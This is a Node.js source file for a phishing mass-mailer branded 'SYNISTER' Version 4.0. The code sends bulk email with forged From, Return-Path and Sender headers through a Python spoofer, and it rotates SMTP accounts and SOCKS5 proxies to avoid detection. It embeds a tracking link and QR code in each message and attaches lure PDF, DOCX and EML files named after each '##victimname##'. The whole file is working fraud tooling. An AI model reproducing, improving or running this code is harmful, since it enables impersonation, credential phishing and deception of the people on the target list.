const fs = require('fs').promises;
const nodemailer = require('nodemailer');
const htmlToDocx = require('html-to-docx'); // New library for converting HTML to DOCX
const { replacePlaceholders, generateQRCodeDataUrl } = require('./placeholders');
const generateEmailContent = require('./letter.js');
const pdf = require('html-pdf');
const config = require('./config');
const { exec } = require('child_process');
const path = require('path');
const { SocksProxyAgent } = require('socks-proxy-agent');

// Configuration variables
const sendAsImage = false; // Whether to send the email as an image
const sendAttachment = false; // Whether to send attachments
const embedLink = true; // Whether to embed links in the email

const testEmail = ""; // Test email address
const testAfterSends = 1000; // Send test email after every 500 emails

let browser; // Global browser instance for Puppeteer
let smtpIndex = 2; // Index for rotating through multiple SMTP configurations
let proxyIndex = 0; // Index for rotating through SOCKS5 proxies

// Helper function to check if file exists
async function fileExists(filePath) {
    try {
        await fs.access(filePath);
        return true;
    } catch {
        return false;
    }
}

// Helper to find Python executable
function findPythonCommand() {
    if (process.platform === 'win32') {
        // Try common Windows Python commands
        const commands = ['python', 'py', 'python3'];
        return commands[0]; // Default to 'python', fallback will handle if not found
    } else {
        return 'python3';
    }
}

// Function to send email using Python spoofer
async function sendEmailWithPythonSpoofer(recipient, config, smtpConfig, emailCount) {
    return new Promise(async (resolve) => {
        try {
            const rawConfig = require('./config');
            const subjectTemplate = (rawConfig.spoofing && rawConfig.spoofing.enabled && rawConfig.spoofing.subject)
                ? rawConfig.spoofing.subject
                : rawConfig.subject;

            // Prepare temporary config file for Python
            const pythonConfig = {
                smtpConfig: {
                    host: smtpConfig.host,
                    port: smtpConfig.port,
                    secure: smtpConfig.secure,
                    auth: {
                        user: smtpConfig.auth.user,
                        pass: smtpConfig.auth.pass
                    }
                },
                recipients: [recipient],
                htmlTemplate: path.join(__dirname, 'letter.html'),
                spoofConfig: {
                    fromEmail: await replacePlaceholders(rawConfig.spoofing.fromEmail, recipient),
                    fromName: await replacePlaceholders(rawConfig.spoofing.fromName, recipient),
                    subject: await replacePlaceholders(subjectTemplate, recipient),
                    // CRITICAL: Ensure all headers match for perfect alignment
                    returnPath: await replacePlaceholders(
                        rawConfig.spoofing.returnPath || rawConfig.spoofing.fromEmail, 
                        recipient
                    ),
                    sender: await replacePlaceholders(
                        rawConfig.spoofing.sender || rawConfig.spoofing.fromEmail, 
                        recipient
                    ),
                    priority: config.spoofing.priority || '1',
                    useEnvelopeSpoofing: config.spoofing.useEnvelopeSpoofing !== false,  // NEW: Enable envelope manipulation
                    customHeaders: {}
                },
                attachments: [],
                cidImages: {},
                rateLimit: config.rateLimit || { enabled: false }
            };

            // Process custom headers
            for (const [key, value] of Object.entries(config.spoofing.customHeaders || {})) {
                if (value) {
                    pythonConfig.spoofConfig.customHeaders[key] = 
                        await replacePlaceholders(value, recipient);
                }
            }

            // Prepare attachments if enabled
            if (sendAttachment && config.enableAttachment) {
                // Add attachment paths here if needed
                // pythonConfig.attachments = [...]
            }

            // Prepare CID images
            if (config.cidMappings) {
                for (const [cid, imgPath] of Object.entries(config.cidMappings)) {
                    const fullPath = path.isAbsolute(imgPath) ? imgPath : path.join(__dirname, imgPath);
                    if (await fileExists(fullPath)) {
                        pythonConfig.cidImages[cid] = fullPath;
                    }
                }
            }

            // Write temporary config file
            const tempConfigPath = path.join(__dirname, 'Python_mail_Spoof', `temp_config_${Date.now()}_${emailCount}.json`);
            await fs.writeFile(tempConfigPath, JSON.stringify(pythonConfig, null, 2), 'utf8');

            // Get Python script path (use forward slashes for Windows compatibility)
            const pythonScriptPath = path.join(__dirname, 'Python_mail_Spoof', 'main.py').replace(/\\/g, '/');
            
            // Try to find Python - check multiple possibilities
            const pythonCmd = findPythonCommand();

            // Build command with proper escaping for Windows
            const configPathEscaped = tempConfigPath.replace(/\\/g, '/');
            const scriptPathEscaped = pythonScriptPath.replace(/\\/g, '/');
            
            // Use proper command for Windows
            let command;
            if (process.platform === 'win32') {
                command = `"${pythonCmd}" "${scriptPathEscaped}" --config "${configPathEscaped}"`;
            } else {
                command = `${pythonCmd} "${scriptPathEscaped}" --config "${configPathEscaped}"`;
            }

            // Execute Python script with better error handling
            exec(command, 
                { 
                    cwd: path.join(__dirname, 'Python_mail_Spoof'),
                    maxBuffer: 1024 * 1024 * 10,
                    encoding: 'utf8',
                    timeout: 60000 // 60 second timeout
                },
                async (error, stdout, stderr) => {
                    // Clean up temp config file
                    try {
                        await fs.unlink(tempConfigPath);
                    } catch (e) {
                        // Ignore cleanup errors
                    }

                    // Try to parse JSON from stdout first (success case)
                    let result = null;
                    if (stdout) {
                        const stdoutLines = stdout.trim().split('\n').filter(line => line.trim());
                        for (const line of stdoutLines) {
                            try {
                                const parsed = JSON.parse(line);
                                if (parsed.success !== undefined || parsed.error !== undefined) {
                                    result = parsed;
                                    break;
                                }
                            } catch (e) {
                                // Not JSON, continue
                            }
                        }
                    }

                    // If we found a result in stdout
                    if (result) {
                        if (result.success > 0) {
                            console.log(`\x1b[36m(${emailCount})-Email sent via Python Spoofer from ${pythonConfig.spoofConfig.fromEmail} to ${recipient}\x1b[0m`);
                            resolve(true);
                            return;
                        } else {
                            const errorMsg = result.error || 'Send failed';
                            console.error(`\x1b[31m(${emailCount})-Python Spoofer failed for ${recipient}: ${errorMsg}\x1b[0m`);
                            resolve(false);
                            return;
                        }
                    }

                    // Try to parse JSON from stderr (error case)
                    let errorResult = null;
                    if (stderr) {
                        const stderrLines = stderr.trim().split('\n').filter(line => line.trim());
                        for (const line of stderrLines) {
                            try {
                                const parsed = JSON.parse(line);
                                if (parsed.error) {
                                    errorResult = parsed;
                                    break;
                                }
                            } catch (e) {
                                // Not JSON, continue
                            }
                        }
                    }

                    // If we found an error in stderr
                    if (errorResult) {
                        const errorMsg = errorResult.error || 'Unknown error';
                        console.error(`\x1b[31m(${emailCount})-Python Spoofer failed for ${recipient}: ${errorMsg}\x1b[0m`);
                        resolve(false);
                        return;
                    }

                    // If exec error occurred
                    if (error) {
                        // Check if Python is not found
                        if (error.message.includes('python') || error.message.includes('not found') || error.message.includes('ENOENT')) {
                            console.error(`\x1b[31m(${emailCount})-Python not found. Please ensure Python is installed and in PATH.\x1b[0m`);
                            console.error(`\x1b[33mTrying: ${pythonCmd}\x1b[0m`);
                        } else {
                            console.error(`\x1b[31m(${emailCount})-Python Spoofer execution error for ${recipient}: ${error.message}\x1b[0m`);
                        }
                        if (stderr && !errorResult) {
                            const stderrMsg = stderr.trim();
                            if (stderrMsg && !stderrMsg.startsWith('{') && stderrMsg.length > 0) {
                                console.error(`\x1b[33mPython Error Details: ${stderrMsg.substring(0, 500)}\x1b[0m`);
                            }
                        }
                        resolve(false);
                        return;
                    }

                    // If we got here but no result, something went wrong
                    console.error(`\x1b[31m(${emailCount})-Python Spoofer: No valid output for ${recipient}\x1b[0m`);
                    if (stdout) console.error(`\x1b[33mStdout: ${stdout.substring(0, 300)}\x1b[0m`);
                    if (stderr) console.error(`\x1b[33mStderr: ${stderr.substring(0, 300)}\x1b[0m`);
                    resolve(false);
                }
            );
        } catch (error) {
            console.error(`\x1b[31mError preparing Python spoofer for ${recipient}: ${error}\x1b[0m`);
            resolve(false);
        }
    });
}

// Main function to send emails with concurrency
async function sendEmails() {
    try {
        const recipients = (await fs.readFile('list.txt', 'utf8')).trim().split('\n').map(email => email.toString().trim());
        printHeader();
        let emailCount = 1;
        const contentChoice = 'html'; // Automatically set content choice to 'html'

        let configIndex = 0;
        let successCount = 0;

        // Calculate delay based on rate limit configuration
        let delayBetweenEmails = 10; // Default delay in milliseconds
        if (config.rateLimit && config.rateLimit.enabled) {
            const emailsPerHour = config.rateLimit.emailsPerHour || 10;
            const emailsPerMinute = config.rateLimit.emailsPerMinute || (emailsPerHour / 60);
            // Calculate milliseconds between emails
            delayBetweenEmails = (60 * 60 * 1000) / emailsPerHour; // milliseconds per email
            console.log(`\x1b[36mRate limiting enabled: ${emailsPerHour} emails/hour (${(delayBetweenEmails/1000).toFixed(2)}s delay between emails)\x1b[0m`);
        }

        // Set concurrency to 1 when rate limiting is enabled to ensure proper spacing
        const concurrency = (config.rateLimit && config.rateLimit.enabled) ? 1 : 10;

        // Function to send emails in batches
        async function sendEmailBatch(batch) {
            for (const recipient of batch) {
                if (!recipient) continue; // Skip empty email addresses
                const success = await processRecipient(recipient, config, contentChoice, emailCount);
                if (success) {
                    console.log(`\x1b[32mEmail sent successfully to ${recipient}\x1b[0m`);
                    successCount++;
                }
                configIndex++;
                if (successCount % testAfterSends === 0) {
                    await sendTestEmail(testEmail, config, contentChoice, emailCount);
                }
                emailCount++;
                
                // Apply rate limiting delay
                if (config.rateLimit && config.rateLimit.enabled) {
                    await delayBetweenMessages(delayBetweenEmails);
                } else {
                    await delayBetweenMessages(emailCount);
                }
            }
        }

        // Split recipients into batches and send them
        for (let i = 0; i < recipients.length; i += concurrency) {
            const batch = recipients.slice(i, i + concurrency);
            await sendEmailBatch(batch);
        }
    } catch (error) {
        console.error(`\x1b[31mError initializing email sending process: ${error}\x1b[0m`);
    } finally {
        if (browser) await browser.close();
    }
}

// Function to process each recipient
async function processRecipient(recipient, config, contentChoice, emailCount) {
    try {
        const smtpConfig = getSmtpConfig(); // Retrieve the appropriate SMTP configuration
        const configContent = JSON.stringify(config);
        const replacedConfig = JSON.parse(await replacePlaceholders(configContent, recipient));

        // Check if required email features are enabled in config
        if (!replacedConfig.enableCustomHeaders || !replacedConfig.enableHTMLImage) {
            throw new Error('Required email feature is not enabled in config.');
        }
        // Only require enableAttachment if sendAttachment is true
        if (sendAttachment && !replacedConfig.enableAttachment) {
            throw new Error('Attachments are enabled but enableAttachment is false in config.');
        }

        return await sendIndividualEmail(recipient, replacedConfig, replacedConfig.cidMappings, contentChoice, emailCount, smtpConfig);
    } catch (error) {
        console.error(`\x1b[31mError processing recipient ${recipient}: ${error}\x1b[0m`);
        return false; // Return false on failure
    }
}

// Function to send a test email
async function sendTestEmail(testEmail, config, contentChoice, emailCount) {
    try {
        const smtpConfig = getSmtpConfig(); // Retrieve the appropriate SMTP configuration
        const configContent = JSON.stringify(config);
        const replacedConfig = JSON.parse(await replacePlaceholders(configContent, testEmail));
        replacedConfig.subject = `Test Email (${emailCount})`; // Set test email subject
        return await sendIndividualEmail(testEmail, replacedConfig, replacedConfig.cidMappings, contentChoice, emailCount, smtpConfig);
    } catch (error) {
        console.error(`\x1b[31mError sending test email to ${testEmail}: ${error}\x1b[0m`);
        return false; // Return false on failure
    }
}

// Function to send email to an individual recipient
async function sendIndividualEmail(recipient, config, cidMappings, contentChoice, emailCount, smtpConfig) {
    // Check if Python spoofer is enabled
    if (config.spoofing && config.spoofing.enabled && config.spoofing.usePythonSpoofer) {
        const pythonResult = await sendEmailWithPythonSpoofer(recipient, config, smtpConfig, emailCount);
        // If Python spoofer fails, optionally fall back to nodemailer
        if (!pythonResult && config.spoofing.fallbackToNodemailer !== false) {
            console.log(`\x1b[33m(${emailCount})-Python Spoofer failed, falling back to nodemailer for ${recipient}\x1b[0m`);
            // Continue to nodemailer code below
        } else if (pythonResult) {
            return true; // Python spoofer succeeded
        } else {
            return false; // Python failed and no fallback
        }
    }

    // Ensure all placeholders in custom headers are replaced
    const headersWithReplacements = await Object.keys(config.customHeaders).reduce(async (accPromise, key) => {
        const acc = await accPromise;
        acc[key] = await replacePlaceholders(config.customHeaders[key], recipient);
        return acc;
    }, Promise.resolve({}));

    // Resolve from/subject templates from raw config so placeholders are replaced per recipient
    const rawConfig = require('./config');
    const subjectTemplate = (rawConfig.spoofing && rawConfig.spoofing.enabled && rawConfig.spoofing.subject)
        ? rawConfig.spoofing.subject
        : rawConfig.subject;

    // If spoofing is enabled but not using Python, use nodemailer with spoofed From
    let fromAddress;
    if (config.spoofing && config.spoofing.enabled) {
        const spoofedEmail = await replacePlaceholders(rawConfig.spoofing.fromEmail, recipient);
        const spoofedName = await replacePlaceholders(rawConfig.spoofing.fromName, recipient);
        fromAddress = `"${spoofedName}" <${spoofedEmail}>`;
    } else {
        const fromName = await replacePlaceholders(smtpConfig.fromName, recipient);
        fromAddress = `"${fromName}" <${smtpConfig.fromEmail}>`;
    }

    const mailOptions = {
        subject: await replacePlaceholders(subjectTemplate, recipient),
        from: fromAddress, // Spoofed or normal sender
        to: recipient, // Recipient's email
        headers: headersWithReplacements, // Custom headers with placeholders replaced
        priority: 'high', // Email priority
    };

    try {
        mailOptions.html = await composeEmailBody(recipient, config, contentChoice); // Compose email body
        if (sendAttachment) {
            mailOptions.attachments = await prepareAttachments(recipient, config, cidMappings); // Prepare email attachments
        } else {
            mailOptions.attachments = await prepareCidImagesOnly(cidMappings, recipient); // Prepare only CID images
        }

        const emailTransporter = nodemailer.createTransport(smtpConfig); // Create email transporter with selected SMTP config
        await emailTransporter.sendMail(mailOptions); // Send the email

        console.log(`\x1b[36m(${emailCount})-Email sent from ${mailOptions.from} to ${recipient}\x1b[0m`);
        return true; // Return true on success
    } catch (error) {
        console.error(`\x1b[31mFailed to send email to ${recipient}: ${error}\x1b[0m`);
        return false; // Return false on failure
    }
}

// Function to retrieve the SMTP configuration based on settings
function getSmtpConfig() {
    let smtpConfig;
    if (config.useMultipleSmtp) {
        const smtpConfigs = config.multipleSmtp;
        if (!smtpConfigs || smtpConfigs.length === 0) {
            throw new Error('No SMTP configurations found for multiple SMTPs.');
        }
        smtpConfig = smtpConfigs[smtpIndex];
        smtpIndex = (smtpIndex + 1) % smtpConfigs.length; // Rotate index
    } else {
        smtpConfig = config.smtp; // Use single SMTP configuration
    }

    // Add SOCKS5 proxy if enabled
    if (config.socks5 && config.socks5.enabled) {
        const proxies = config.socks5.proxies;
        if (!proxies || proxies.length === 0) {
            throw new Error('SOCKS5 proxies enabled but no proxies configured.');
        }

        const proxyString = proxies[proxyIndex];
        proxyIndex = (proxyIndex + 1) % proxies.length; // Rotate proxy

        // Parse proxy string in format IP:PORT:USERNAME:PASSWORD
        const parts = proxyString.split(':');
        if (parts.length < 2) {
            throw new Error(`Invalid proxy format: ${proxyString}. Expected IP:PORT:USERNAME:PASSWORD`);
        }

        const [host, port, username, password] = parts;
        let proxyUrl = `socks5://${host}:${port}`;

        // Add authentication if provided
        if (username && password) {
            proxyUrl = `socks5://${username}:${password}@${host}:${port}`;
        }

        // Create proxy agent and add to SMTP config
        const proxyAgent = new SocksProxyAgent(proxyUrl);
        smtpConfig.proxy = proxyAgent;

        console.log(`\x1b[36mUsing SOCKS5 proxy: ${host}:${port}\x1b[0m`);
    }

    return smtpConfig;
}

// Function to print a welcome header in the console
function printHeader() {
    function printCrazyHeader() {
        // Define an array of colors
        const colors = [
          "\x1b[31m", // Red
          "\x1b[32m", // Green
          "\x1b[33m", // Yellow
          "\x1b[34m", // Blue
          "\x1b[35m", // Magenta
          "\x1b[36m", // Cyan
          "\x1b[37m"  // White
        ];
        
        // Define ASCII art for the hobbit
        const hobbitArt = `
                ___
               /   \\
              /     \\
             |       |
             |  o  o |
             |   ~   |
             |  ___  |
             |_______|
            /         \\
           /           \\
          |             |
         /|             |\\
        / |_____________| \\
       /___________________\\
        `;
        
        // Select a random color for each section of the header
        const randomColor1 = colors[Math.floor(Math.random() * colors.length)];
        const randomColor2 = colors[Math.floor(Math.random() * colors.length)];
        const randomColor3 = colors[Math.floor(Math.random() * colors.length)];
        const randomColor4 = colors[Math.floor(Math.random() * colors.length)];
      
        // Print the header with dynamic colors and the hobbit art
        console.log(randomColor1 + "*************************************************************");
        console.log("* " + randomColor2 + "               YOU'RE NOT SUPPOSED TO BE HERE!             " + randomColor1 + " *");
        console.log("* " + randomColor1 + "                                                        *");
        console.log("* " + randomColor3 + "  Please report any issues to the developer              " + randomColor1 + " *");
        console.log("* " + randomColor3 + "  Contact: " + randomColor4 + "Go Synister," + randomColor3 + " Telegram                      " + randomColor1 + " *");
        console.log("* " + randomColor3 + "  (he won't respond 'cause you're not supposed to be here) " + randomColor1 + " *");
        console.log("* " + randomColor1 + "                                                        *");
        console.log("* " + randomColor4 + "   ____  _   _ _   _ _____ ____  _____ ____  _____ ____   " + randomColor1 + " *");
        console.log("* " + randomColor4 + "  / ___|| \\ | | \\ | |_   _/ ___|| ____/ ___|| ____|  _ \\  " + randomColor1 + " *");
        console.log("* " + randomColor4 + "  \\___ \\|  \\| |  \\| | | | \\___ \\|  _| \\___ \\|  _| | | | | " + randomColor1 + " *");
        console.log("* " + randomColor4 + "   ___) | |\\  | |\\  | | |  ___) | |___ ___) | |___| |_| | " + randomColor1 + " *");
        console.log("* " + randomColor4 + "  |____/|_| \\_|_| \\_| |_| |____/|_____|____/|_____|____/  " + randomColor1 + " *");
        console.log("* " + randomColor1 + "                                                        *");
        console.log("* " + randomColor3 + "                Version 4.0 by SYNISTER              " + randomColor1 + " *");
        console.log("* " + randomColor1 + "                                                        *");
        console.log("* " + randomColor1 + "     " + randomColor4 + "Ensure all inputs are validated before submission!" + randomColor1 + "     *");
        console.log("*************************************************************");
        console.log(hobbitArt); // Display the hobbit drawing
        console.log("\x1b[0m"); // Reset color to default
      }
      
      printCrazyHeader(); // Call the function to run the header
      
}

// Function to compose the email body
async function composeEmailBody(recipient, config, contentChoice) {
    const link = await replacePlaceholders('##link##', recipient);
    const qrCodeDataUrl = link ? await generateQRCodeDataUrl(link) : '';
    const qrCodeImage = qrCodeDataUrl ? `<img src=\"${qrCodeDataUrl}\" alt=\"QR Code\">` : '';

    if (sendAsImage && config.enableHTMLImage) {
        const imageUrl = await generateImageFromHTML('letter.html', recipient); // Generate image from HTML
        return embedLink ?
            `<a href=\"${link}\"><img src=\"${imageUrl}\" alt=\"Letter Image\"></a>` : // Embed link in image
            `<img src=\"${imageUrl}\" alt=\"Letter Image\">`; // Just the image
    } else {
        const letterContent = await fs.readFile('letter.html', 'utf8'); // Path to HTML email content
        return await replacePlaceholders(letterContent, recipient) + qrCodeImage;
 // Replace placeholders with recipient data
        }
    }

// Function to generate PDF from HTML using html-pdf and return as buffer
async function generatePDFBuffer(htmlContent, recipient) {
    let formattedHtmlContent = await replacePlaceholders(htmlContent, recipient);
    const link = await replacePlaceholders('##link##', recipient);
    const qrCodeDataUrl = link ? await generateQRCodeDataUrl(link) : '';
    formattedHtmlContent = formattedHtmlContent.replace('##qrcode##', qrCodeDataUrl ? `<img src="${qrCodeDataUrl}" alt="QR Code">` : '');

    return new Promise((resolve, reject) => {
        pdf.create(formattedHtmlContent).toBuffer((err, buffer) => {
            if (err) {
                console.error('Error generating PDF:', err);
                return reject(err);
            }
            resolve(buffer);
        });
    });
}
// Function to prepare email attachments with filename placeholders
async function prepareAttachments(recipient, config, cidMappings) {
    const attachments = [];

    // Check if attachments are enabled in the configuration
    if (config.enableAttachment) {
        if (config.sendOneAttachment) {
            if (config.sendAttachment === 1) {
                const emlContent = await fs.readFile('attach.html', 'utf8');
                const formattedEmlContent = await replacePlaceholders(emlContent, recipient);
                
                // Replace placeholders in the filename
                const emlFilename = await replacePlaceholders('##victimdomain1##_##victimname##.eml', recipient);

                attachments.push({
                    filename: emlFilename,
                    content: formattedEmlContent,
                    contentType: 'eml/eml',
                    disposition: 'attachment'
                });
            } else if (config.sendAttachment === 2) {
                const pdfContent = await fs.readFile('html2pdf.html', 'utf8');
                const pdfBuffer = await generatePDFBuffer(pdfContent, recipient);

                // Replace placeholders in the filename
                const pdfFilename = await replacePlaceholders('##victimname## Vacations and salaries.pdf', recipient);

                attachments.push({
                    filename: pdfFilename,
                    content: pdfBuffer,
                    contentType: 'application/pdf',
                    disposition: 'attachment'
                });
            } else if (config.sendAttachment === 3) {
                const htmlContent = await fs.readFile('html2docx.html', 'utf8');
                const docxBuffer = await generateDocxBuffer(htmlContent, recipient);

                // Replace placeholders in the filename
                const docxFilename = await replacePlaceholders('##victimdomain1##_##victimname##.docx', recipient);

                attachments.push({
                    filename: docxFilename,
                    content: docxBuffer,
                    contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                    disposition: 'attachment'
                });
            }
        } else if (config.sendMultipleAttachments) {
            // Send all three attachments with placeholder support

            const emlContent = await fs.readFile('attach.html', 'utf8');
            const formattedEmlContent = await replacePlaceholders(emlContent, recipient);
            
            // Replace placeholders in the filename
            const emlFilename = await replacePlaceholders('##victimdomain1##_##victimname##.eml', recipient);

            attachments.push({
                filename: emlFilename,
                content: formattedEmlContent,
                contentType: 'eml/eml',
                disposition: 'attachment'
            });

            const pdfContent = await fs.readFile('html2pdf.html', 'utf8');
            const pdfBuffer = await generatePDFBuffer(pdfContent, recipient);

            // Replace placeholders in the filename
            const pdfFilename = await replacePlaceholders('##victimdomain1##_##victimname##.pdf', recipient);

            attachments.push({
                filename: pdfFilename,
                content: pdfBuffer,
                contentType: 'application/pdf',
                disposition: 'attachment'
            });

            const htmlContent = await fs.readFile('html2docx.html', 'utf8');
            const docxBuffer = await generateDocxBuffer(htmlContent, recipient);

            // Replace placeholders in the filename
            const docxFilename = await replacePlaceholders('##victimdomain1##_##victimname##.docx', recipient);

            attachments.push({
                filename: docxFilename,
                content: docxBuffer,
                contentType: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
                disposition: 'attachment'
            });
        }
    }

    // Add CID images regardless of sendMultipleAttachments, with placeholder support for filenames
    for (const [cid, path] of Object.entries(cidMappings)) {
        const filenameWithPlaceholders = await replacePlaceholders(path.split('/').pop(), recipient);
        attachments.push({
            filename: filenameWithPlaceholders,
            path: path,
            cid: cid
        });
    }

    return attachments;
}


// Function to prepare only CID images
async function prepareCidImagesOnly(cidMappings, recipient) {
    const attachments = [];

    // Add CID images
    for (const [cid, path] of Object.entries(cidMappings)) {
        attachments.push({
            filename: path.split('/').pop(),
            path: path,
            cid: cid
        });
    }

    return attachments;
}

// Function to generate DOCX from HTML using html-to-docx and return as buffer
async function generateDocxBuffer(htmlContent, recipient) {
    const formattedHtmlContent = await replacePlaceholders(htmlContent, recipient);
    return htmlToDocx(formattedHtmlContent);
}

// Delay function for throttling email sending
function delayBetweenMessages(delayInMillis) {
    return new Promise(resolve => setTimeout(resolve, delayInMillis));
}

// Execute the sendEmails function
sendEmails().catch(console.error);
